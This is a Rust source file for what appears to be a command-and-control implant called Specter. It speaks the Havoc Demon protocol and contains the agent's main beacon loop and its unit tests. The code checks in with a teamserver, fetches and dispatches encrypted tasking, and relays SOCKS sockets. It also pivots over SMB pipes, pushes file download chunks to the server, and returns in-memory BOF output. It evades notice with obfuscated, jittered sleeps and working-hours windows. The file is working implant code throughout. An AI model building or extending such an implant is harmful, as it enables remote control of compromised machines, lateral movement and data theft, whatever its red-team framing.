//! Legacy Demon-protocol run-loop and checkin flow.

use std::sync::{Arc, Mutex};

use red_cell_common::crypto::{ctr_blocks_for_len, decrypt_agent_data_at_offset};
use red_cell_common::demon::{DemonCommand, DemonMessage};
use time::{OffsetDateTime, Time};
use tokio::task;
use tracing::{info, warn};

use crate::dispatch::{self, DispatchResult, Response};
use crate::error::SpecterError;
use crate::metadata::current_unix_secs;
use crate::pivot::PivotState;
use crate::protocol::{build_callback_packet, parse_tasking_response};

use super::SpecterAgent;

// ── Working-hours helpers ────────────────────────────────────────────────────

fn current_local_time() -> OffsetDateTime {
    OffsetDateTime::now_local().unwrap_or_else(|_| OffsetDateTime::now_utc())
}

fn unpack_working_hours_time(working_hours: u32, hour_shift: u32, minute_shift: u32) -> Time {
    let hour = ((working_hours >> hour_shift) & 0b01_1111) as u8;
    let minute = ((working_hours >> minute_shift) & 0b11_1111) as u8;
    Time::from_hms(hour.min(23), minute.min(59), 0).unwrap_or(Time::MIDNIGHT)
}

fn is_within_working_hours_at(working_hours: i32, now: OffsetDateTime) -> bool {
    let working_hours = working_hours as u32;
    if (working_hours >> 22) & 1 == 0 {
        return true;
    }

    let start = unpack_working_hours_time(working_hours, 17, 11);
    let end = unpack_working_hours_time(working_hours, 6, 0);
    let current = now.time();

    if current.hour() < start.hour() || current.hour() > end.hour() {
        return false;
    }
    if current.hour() == start.hour() && current.minute() < start.minute() {
        return false;
    }
    if current.hour() == end.hour() && current.minute() > end.minute() {
        return false;
    }

    true
}

fn sleep_until_working_hours(working_hours: i32, now: OffsetDateTime) -> u64 {
    let working_hours = working_hours as u32;
    let start = unpack_working_hours_time(working_hours, 17, 11);
    let end = unpack_working_hours_time(working_hours, 6, 0);
    let current_minutes = u64::from(now.hour()) * 60 + u64::from(now.minute());
    let start_minutes = u64::from(start.hour()) * 60 + u64::from(start.minute());
    let end_minutes = u64::from(end.hour()) * 60 + u64::from(end.minute());

    let minutes_until_start = if current_minutes > end_minutes {
        ((24 * 60) - current_minutes) + start_minutes
    } else {
        start_minutes.saturating_sub(current_minutes)
    };
    minutes_until_start.saturating_mul(60_000)
}

/// Recover sole ownership after the blocking task has dropped its `Arc` clone.
fn take_pivot_state_from_shared_arc(
    state: Arc<Mutex<PivotState>>,
) -> Result<PivotState, SpecterError> {
    let mutex = Arc::try_unwrap(state).map_err(|_| {
        SpecterError::Transport("pivot state: unexpected shared arc (internal error)".into())
    })?;
    Ok(mutex.into_inner().unwrap_or_else(|poisoned| poisoned.into_inner()))
}

impl SpecterAgent {
    /// Check whether the configured kill date has been reached.
    ///
    /// The kill date is stored as a Unix timestamp (seconds since
    /// January 1, 1970 UTC), matching the format emitted by the teamserver's
    /// payload builder and normalised by `common::domain::validate_kill_date`.
    /// Returns `true` when the current time meets or exceeds the deadline.
    pub(super) fn reached_kill_date(&self) -> bool {
        let Some(kill_date) = self.config.kill_date else {
            return false;
        };
        let now = current_unix_secs();
        now >= kill_date
    }

    /// Block until the current time falls within the configured working-hours
    /// window. Returns immediately when no working hours are configured.
    async fn wait_for_working_hours(&self) {
        let Some(wh) = self.config.working_hours else { return };
        let now = current_local_time();
        if is_within_working_hours_at(wh, now) {
            return;
        }
        let delay_ms = sleep_until_working_hours(wh, now);
        info!(delay_ms, "outside working hours; sleeping until window opens");
        crate::sleep_obf::obfuscated_sleep(delay_ms, self.config.sleep_technique).await;
    }

    /// Send a `COMMAND_CHECKIN` callback to the teamserver.
    pub async fn checkin(&mut self) -> Result<Vec<u8>, SpecterError> {
        let response = self.send_callback(DemonCommand::CommandCheckin, 0, &[]).await?;
        let tasking = parse_tasking_response(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            &response,
        )?;
        self.ctr_offset = tasking.next_recv_ctr_offset;

        Ok(tasking.decrypted)
    }

    /// Request queued tasking from the teamserver.
    pub async fn get_job(&mut self) -> Result<DemonMessage, SpecterError> {
        let response = self.send_callback(DemonCommand::CommandGetJob, 0, &[]).await?;
        let message = self.decrypt_job_message(&response)?;
        Ok(message)
    }

    /// Run the main agent loop: init, then dispatch server tasking repeatedly.
    ///
    /// Each iteration:
    /// 1. Checks whether the kill date has been reached; if so, notifies the
    ///    teamserver with `CommandKillDate` and terminates.
    /// 2. Sleeps for the configured interval (with optional jitter).
    /// 3. Sends a `CommandCheckin` heartbeat.
    /// 4. Sends `CommandGetJob` and dispatches any returned task packages.
    /// 5. Sends a response callback for each dispatched command.
    pub async fn run(&mut self) -> Result<(), SpecterError> {
        if self.reached_kill_date() {
            warn!(
                agent_id = format_args!("0x{:08X}", self.agent_id),
                kill_date = ?self.config.kill_date,
                "kill date already reached at startup; exiting"
            );
            return Ok(());
        }

        self.wait_for_working_hours().await;

        if self.config.listener_pub_key.is_some() {
            self.ecdh_init_handshake().await?;
            return self.run_ecdh_loop().await;
        }
        self.init_handshake().await?;

        loop {
            // ── Kill-date check ─────────────────────────────────────────
            if self.reached_kill_date() {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    kill_date = ?self.config.kill_date,
                    "kill date reached — notifying teamserver and exiting"
                );
                // Best-effort: notify the server. If the send fails we still
                // exit — the whole point of a kill date is unconditional cleanup.
                let _ = self.send_callback(DemonCommand::CommandKillDate, 0, &[]).await;
                return Ok(());
            }

            let delay = self.compute_sleep_delay();
            crate::sleep_obf::obfuscated_sleep(delay, self.config.sleep_technique).await;

            // Heartbeat — lets the server record liveness; response is normally NOJOB.
            if let Err(e) = self.checkin().await {
                warn!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    error = %e,
                    "checkin failed, will retry"
                );
                continue;
            }

            // Request and dispatch any queued server tasking.
            let message = match self.get_job().await {
                Ok(m) => m,
                Err(e) => {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "get_job failed, will retry"
                    );
                    continue;
                }
            };

            for package in &message.packages {
                // CommandSocket requires async I/O — handle it directly rather
                // than going through the synchronous dispatch() path.
                if package.command_id == u32::from(DemonCommand::CommandSocket) {
                    if let Err(e) =
                        self.socket_state.handle_command(package.request_id, &package.payload).await
                    {
                        warn!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            error = %e,
                            "socket command failed"
                        );
                    }
                    continue;
                }

                // CommandPivot manages SMB pipe state — handle it directly so
                // the PivotState can track connections and poll them later.
                if package.command_id == u32::from(DemonCommand::CommandPivot) {
                    match self.handle_pivot_command(&package.payload).await {
                        Ok(Some(resp)) => {
                            let rid = if resp.request_id != 0 {
                                resp.request_id
                            } else {
                                package.request_id
                            };
                            if let Err(e) =
                                self.send_callback_raw(resp.command_id, rid, &resp.payload).await
                            {
                                warn!(
                                    agent_id = format_args!("0x{:08X}", self.agent_id),
                                    error = %e,
                                    "failed to send pivot response"
                                );
                            }
                        }
                        Ok(None) => {}
                        Err(e) => {
                            warn!(
                                agent_id = format_args!("0x{:08X}", self.agent_id),
                                error = %e,
                                "pivot command failed"
                            );
                        }
                    }
                    continue;
                }

                let result = dispatch::dispatch(
                    package,
                    &mut self.config,
                    &mut self.token_vault,
                    &mut self.downloads,
                    &mut self.mem_files,
                    &mut self.job_store,
                    &mut self.ps_scripts,
                    &self.bof_output_queue,
                );
                if self.handle_dispatch_result(package.request_id, result).await {
                    // Exit requested — terminate.
                    return Ok(());
                }
            }

            // Poll active sockets, listeners, relays, and SOCKS clients.
            if self.socket_state.has_active_connections() {
                if let Err(e) = self.socket_state.poll().await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "socket poll failed"
                    );
                }
            }

            // Send any pending socket responses back to the teamserver.
            for resp in self.socket_state.drain_responses() {
                let req_id = resp.request_id;
                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send socket response"
                    );
                }
            }

            // Poll connected SMB pivots for child agent responses (mirrors
            // Demon's PivotPush).
            if self.pivot_state.has_active_pivots() {
                if let Err(e) = self.poll_pivots().await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "pivot poll failed"
                    );
                }
            }

            // Send any pending pivot responses back to the teamserver.
            for resp in self.pivot_state.drain_responses() {
                let req_id = resp.request_id;
                if let Err(e) = self.send_callback_raw(resp.command_id, req_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send pivot response"
                    );
                }
            }

            // Push pending download chunks (mirrors Demon's DownloadPush).
            let fs_cmd_id = u32::from(DemonCommand::CommandFs);
            let download_packets = self.downloads.push_chunks(fs_cmd_id);
            for pkt in download_packets {
                if let Err(e) =
                    self.send_callback_raw(pkt.command_id, pkt.request_id, &pkt.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = pkt.command_id,
                        error = %e,
                        "failed to send download chunk"
                    );
                }
            }

            // Drain callbacks queued by background BOF threads and send them
            // to the teamserver as CommandInlineExecute responses.
            let bof_responses = self.drain_bof_output();
            for resp in bof_responses {
                if let Err(e) =
                    self.send_callback_raw(resp.command_id, resp.request_id, &resp.payload).await
                {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send threaded BOF callback"
                    );
                }
            }

            // Poll tracked jobs for natural exit (mirrors Havoc's
            // JobCheckList).  Dead jobs get their handles closed and are
            // reaped so CommandJob/List reflects reality.  Only
            // JOB_TYPE_TRACK_PROCESS entries produce DIED notifications —
            // threads and plain processes are silently reaped.
            let tracked_dead = self.job_store.poll();
            let job_cmd_id = u32::from(DemonCommand::CommandJob);
            for (job_id, request_id) in &tracked_dead {
                let mut payload = Vec::with_capacity(8);
                payload.extend_from_slice(
                    &u32::from(red_cell_common::demon::DemonJobCommand::Died).to_le_bytes(),
                );
                payload.extend_from_slice(&job_id.to_le_bytes());
                if let Err(e) = self.send_callback_raw(job_cmd_id, *request_id, &payload).await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        job_id,
                        request_id,
                        error = %e,
                        "failed to send job-died notification"
                    );
                }
            }
            self.job_store.reap_dead();
        }
    }

    /// Process one dispatch result, sending any required response packets.
    ///
    /// Returns `true` if the agent should terminate.
    async fn handle_dispatch_result(&mut self, request_id: u32, result: DispatchResult) -> bool {
        match result {
            DispatchResult::Ignore => false,
            DispatchResult::Exit => {
                info!(
                    agent_id = format_args!("0x{:08X}", self.agent_id),
                    "CommandExit received — terminating"
                );
                true
            }
            DispatchResult::Respond(resp) => {
                let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                if let Err(e) = self.send_callback_raw(resp.command_id, rid, &resp.payload).await {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        command_id = resp.command_id,
                        error = %e,
                        "failed to send response"
                    );
                }
                false
            }
            DispatchResult::MultiRespond(resps) => {
                for resp in resps {
                    let rid = if resp.request_id != 0 { resp.request_id } else { request_id };
                    if let Err(e) =
                        self.send_callback_raw(resp.command_id, rid, &resp.payload).await
                    {
                        warn!(
                            agent_id = format_args!("0x{:08X}", self.agent_id),
                            command_id = resp.command_id,
                            error = %e,
                            "failed to send response"
                        );
                    }
                }
                false
            }
        }
    }

    /// Drain pending BOF callbacks from background threads, converting each
    /// [`coffeeldr::BofCallback`] into a [`Response`] with the
    /// `CommandInlineExecute` command ID.
    pub(super) fn drain_bof_output(&self) -> Vec<Response> {
        let callbacks = match self.bof_output_queue.lock() {
            Ok(mut q) => std::mem::take(&mut *q),
            Err(poisoned) => std::mem::take(&mut *poisoned.into_inner()),
        };

        let cmd_id = u32::from(DemonCommand::CommandInlineExecute);
        callbacks
            .into_iter()
            .map(|cb| {
                let mut payload = Vec::with_capacity(4 + cb.payload.len());
                payload.extend_from_slice(&cb.callback_type.to_le_bytes());
                payload.extend_from_slice(&cb.payload);
                Response { command_id: cmd_id, request_id: cb.request_id, payload }
            })
            .collect()
    }

    /// Compute the sleep delay in milliseconds, applying jitter if configured.
    pub(super) fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }
        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let spread = jitter_range.saturating_mul(2);
        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
        base.saturating_sub(jitter_range).saturating_add(jitter)
    }

    /// Run `f` on the blocking pool while keeping [`PivotState`] in an [`Arc`].
    ///
    /// If [`task::spawn_blocking`] returns a [`JoinError`](task::JoinError) (panic or
    /// runtime shutdown), we still reattach the mutex-held state so active pivots and
    /// queued responses are not replaced with [`PivotState::default`].
    async fn with_pivot_state_blocking<F, R>(
        &mut self,
        op_label: &'static str,
        run: F,
    ) -> Result<R, SpecterError>
    where
        F: FnOnce(&mut PivotState) -> R + Send + 'static,
        R: Send + 'static,
    {
        let state = Arc::new(Mutex::new(std::mem::take(&mut self.pivot_state)));
        let state_for_blocking = Arc::clone(&state);
        let join_result = task::spawn_blocking(move || {
            let mut ps = state_for_blocking.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
            run(&mut ps)
        })
        .await;

        self.pivot_state = take_pivot_state_from_shared_arc(state)?;

        join_result.map_err(|e| SpecterError::Transport(format!("{op_label} task failed: {e}")))
    }

    async fn handle_pivot_command(
        &mut self,
        payload: &[u8],
    ) -> Result<Option<Response>, SpecterError> {
        let payload = payload.to_vec();
        let response = self
            .with_pivot_state_blocking("pivot command", move |pivot_state| {
                pivot_state.handle_command(&payload)
            })
            .await?;
        Ok(response)
    }

    async fn poll_pivots(&mut self) -> Result<(), SpecterError> {
        self.with_pivot_state_blocking("pivot poll", |pivot_state| pivot_state.poll()).await?;
        Ok(())
    }

    async fn send_callback(
        &mut self,
        command: DemonCommand,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Vec<u8>, SpecterError> {
        self.send_callback_raw(u32::from(command), request_id, payload).await
    }

    /// Send a callback packet with a raw `command_id` (used by the dispatch loop
    /// to forward arbitrary response command IDs without converting through the
    /// typed `DemonCommand` enum).
    async fn send_callback_raw(
        &mut self,
        command_id: u32,
        request_id: u32,
        payload: &[u8],
    ) -> Result<Vec<u8>, SpecterError> {
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            command_id,
            request_id,
            payload,
        )?;
        let response = self.transport.send(&packet).await?;

        // Monotonic CTR: advance the shared offset by the blocks consumed by the
        // encrypted portion: seq_num(8 LE) + payload_len(4) + payload_bytes.
        let encrypted_len = 8 + 4 + payload.len();
        self.ctr_offset += ctr_blocks_for_len(encrypted_len);
        self.callback_seq += 1;

        Ok(response)
    }

    // ── Legacy Demon-protocol helpers ─────────────────────────────────────────

    fn decrypt_job_message(&mut self, response: &[u8]) -> Result<DemonMessage, SpecterError> {
        if response.is_empty() {
            return Ok(DemonMessage::default());
        }

        let message = DemonMessage::from_bytes(response)?;
        let mut packages = Vec::with_capacity(message.packages.len());

        for mut package in message.packages {
            if !package.payload.is_empty() {
                // Monotonic CTR: decrypt each payload at the shared offset and
                // advance by the blocks consumed by the ciphertext.
                let ciphertext_len = package.payload.len();
                package.payload = decrypt_agent_data_at_offset(
                    &self.session_crypto.key,
                    &self.session_crypto.iv,
                    self.ctr_offset,
                    &package.payload,
                )?;
                self.ctr_offset += ctr_blocks_for_len(ciphertext_len);
            }
            packages.push(package);
        }

        Ok(DemonMessage::new(packages))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::SpecterConfig;
    use red_cell_common::demon::{DemonPackage, DemonPivotCommand};

    #[test]
    fn compute_sleep_delay_no_jitter() {
        let config = SpecterConfig { sleep_delay_ms: 1000, sleep_jitter: 0, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert_eq!(agent.compute_sleep_delay(), 1000);
    }

    #[test]
    fn compute_sleep_delay_with_jitter_is_in_range() {
        // 50% jitter on 10000ms → jitter_range=5000, so output ∈ [5000, 15000].
        let config =
            SpecterConfig { sleep_delay_ms: 10000, sleep_jitter: 50, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        let mut seen_min = u64::MAX;
        let mut seen_max = u64::MIN;
        for _ in 0..200 {
            let delay = agent.compute_sleep_delay();
            assert!((5000..=15000).contains(&delay), "delay {delay} out of [5000, 15000]");
            seen_min = seen_min.min(delay);
            seen_max = seen_max.max(delay);
        }
        // Over 200 draws the spread must be non-trivial (> 100ms) — catches a cancelled jitter.
        assert!(
            seen_max - seen_min > 100,
            "jitter produced no spread: min={seen_min} max={seen_max}"
        );
    }

    #[test]
    fn decrypt_job_message_decrypts_payloads_with_monotonic_ctr() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        // Monotonic CTR: the shared offset starts at some value and advances as
        // each payload is decrypted.  Simulate the server encrypting payloads at
        // successive offsets.
        let start_offset: u64 = 5;
        agent.ctr_offset = start_offset;

        let first_plaintext = vec![0xAA, 0xBB, 0xCC];
        let second_plaintext = vec![0x10; 17];

        // Server encrypts first payload at the current shared offset.
        let first_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            start_offset,
            &first_plaintext,
        )
        .expect("encrypt first payload");

        // Server advances offset after first payload.
        let offset_after_first =
            start_offset + red_cell_common::crypto::ctr_blocks_for_len(first_payload.len());

        let second_payload = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            offset_after_first,
            &second_plaintext,
        )
        .expect("encrypt second payload");

        let response = DemonMessage::new(vec![
            DemonPackage::new(DemonCommand::CommandSleep, 1, first_payload),
            DemonPackage::new(DemonCommand::CommandCheckin, 2, Vec::new()),
            DemonPackage::new(DemonCommand::CommandOutput, 3, second_payload),
        ])
        .to_bytes()
        .expect("serialize job response");

        let message = agent.decrypt_job_message(&response).expect("decrypt job response");

        assert_eq!(message.packages.len(), 3);
        assert_eq!(message.packages[0].payload, first_plaintext);
        assert!(message.packages[1].payload.is_empty());
        assert_eq!(message.packages[2].payload, second_plaintext);
        // Monotonic CTR: offset must have advanced past the initial value.
        assert!(
            agent.ctr_offset() > start_offset,
            "CTR offset must advance after decrypting job payloads"
        );
    }

    #[tokio::test]
    async fn handle_pivot_command_runs_on_blocking_pool() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        let payload = u32::from(DemonPivotCommand::List).to_le_bytes();

        let response = agent.handle_pivot_command(&payload).await.expect("pivot response");
        let response = response.expect("list response");

        assert_eq!(response.command_id, u32::from(DemonCommand::CommandPivot));
        assert_eq!(
            u32::from_le_bytes(response.payload[..4].try_into().expect("subcommand")),
            u32::from(DemonPivotCommand::List)
        );
    }

    #[tokio::test]
    async fn handle_pivot_command_returns_non_windows_connect_error() {
        if cfg!(windows) {
            return;
        }

        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        let pipe = r"\\.\pipe\test";
        let pipe_utf16: Vec<u8> = pipe
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();

        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbConnect).to_le_bytes());
        payload.extend_from_slice(&(pipe_utf16.len() as u32).to_le_bytes());
        payload.extend_from_slice(&pipe_utf16);

        let response = agent.handle_pivot_command(&payload).await.expect("pivot response");
        let response = response.expect("error response");

        assert_eq!(u32::from_le_bytes(response.payload[4..8].try_into().expect("success flag")), 0);
    }

    #[tokio::test]
    async fn poll_pivots_runs_on_blocking_pool() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        agent.poll_pivots().await.expect("pivot poll");
        assert!(!agent.pivot_state.has_active_pivots());
    }

    /// When `spawn_blocking` completes with a join error, pivot state must not
    /// remain the default left behind by `mem::take`.
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn pivot_state_restored_when_blocking_task_panics() {
        let mut agent = SpecterAgent::new(SpecterConfig::default()).expect("agent");
        agent.pivot_state.test_insert_stub_pivot(0x42);
        assert!(agent.pivot_state.has_active_pivots());

        let err = agent
            .with_pivot_state_blocking("pivot test", |_| panic!("forced blocking panic"))
            .await
            .expect_err("blocking task should panic");

        assert!(matches!(err, SpecterError::Transport(_)));
        assert!(
            agent.pivot_state.has_active_pivots(),
            "pivot state must be restored after join error, not left at default"
        );
    }

    // ── Kill-date tests ─────────────────────────────────────────────────────

    #[test]
    fn current_unix_secs_returns_reasonable_value() {
        let ts = current_unix_secs();
        // Must be after 2020-01-01 (Unix timestamp 1577836800).
        assert!(ts > 1_577_836_800, "unix timestamp {ts} should be after 2020");
    }

    #[test]
    fn reached_kill_date_false_when_none() {
        let config = SpecterConfig { kill_date: None, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_false_when_future() {
        // Set kill date far in the future (year ~2100, Unix timestamp 4102444800).
        let future_ts: i64 = 4_102_444_800;
        let config = SpecterConfig { kill_date: Some(future_ts), ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_true_when_past() {
        // Set kill date to a past time (2020-01-01, Unix timestamp 1577836800).
        let past_ts: i64 = 1_577_836_800;
        let config = SpecterConfig { kill_date: Some(past_ts), ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(agent.reached_kill_date());
    }

    #[test]
    fn reached_kill_date_false_when_none_not_zero() {
        // None means no kill date configured — should never trigger.
        let config = SpecterConfig { kill_date: None, ..Default::default() };
        let agent = SpecterAgent::new(config).expect("agent");
        assert!(!agent.reached_kill_date());
    }

    // ── Working-hours free-function tests ────────────────────────────────────

    fn make_time(hour: u8, minute: u8) -> OffsetDateTime {
        let date =
            time::Date::from_calendar_date(2026, time::Month::January, 15).expect("valid date");
        let time = Time::from_hms(hour, minute, 0).expect("valid time");
        date.with_time(time).assume_utc()
    }

    fn pack_working_hours(start_h: u32, start_m: u32, end_h: u32, end_m: u32) -> i32 {
        let enabled = 1u32 << 22;
        let start = (start_h & 0x1F) << 17 | (start_m & 0x3F) << 11;
        let end = (end_h & 0x1F) << 6 | (end_m & 0x3F);
        (enabled | start | end) as i32
    }

    #[test]
    fn working_hours_disabled_returns_true() {
        let wh = 0i32; // bit 22 not set → disabled
        assert!(is_within_working_hours_at(wh, make_time(3, 0)));
    }

    #[test]
    fn within_working_hours_at_midpoint() {
        let wh = pack_working_hours(9, 0, 17, 0);
        assert!(is_within_working_hours_at(wh, make_time(12, 0)));
    }

    #[test]
    fn within_working_hours_at_start_boundary() {
        let wh = pack_working_hours(9, 0, 17, 0);
        assert!(is_within_working_hours_at(wh, make_time(9, 0)));
    }

    #[test]
    fn within_working_hours_at_end_boundary() {
        let wh = pack_working_hours(9, 0, 17, 0);
        assert!(is_within_working_hours_at(wh, make_time(17, 0)));
    }

    #[test]
    fn outside_working_hours_before_start() {
        let wh = pack_working_hours(9, 0, 17, 0);
        assert!(!is_within_working_hours_at(wh, make_time(8, 59)));
    }

    #[test]
    fn outside_working_hours_after_end() {
        let wh = pack_working_hours(9, 0, 17, 0);
        assert!(!is_within_working_hours_at(wh, make_time(17, 1)));
    }

    #[test]
    fn sleep_until_working_hours_before_start() {
        let wh = pack_working_hours(9, 0, 17, 0);
        let now = make_time(7, 0); // 2 hours before start
        let delay_ms = sleep_until_working_hours(wh, now);
        assert_eq!(delay_ms, 120 * 60_000); // 120 minutes
    }

    #[test]
    fn sleep_until_working_hours_after_end() {
        let wh = pack_working_hours(9, 0, 17, 0);
        let now = make_time(18, 0); // 1 hour after end → wraps to next day's start
        // 18:00 → next 09:00 = 15 hours = 900 minutes
        let delay_ms = sleep_until_working_hours(wh, now);
        assert_eq!(delay_ms, 900 * 60_000);
    }

    #[test]
    fn unpack_working_hours_time_extracts_correctly() {
        let wh = pack_working_hours(9, 30, 17, 45) as u32;
        let start = unpack_working_hours_time(wh, 17, 11);
        let end = unpack_working_hours_time(wh, 6, 0);
        assert_eq!(start.hour(), 9);
        assert_eq!(start.minute(), 30);
        assert_eq!(end.hour(), 17);
        assert_eq!(end.minute(), 45);
    }
}
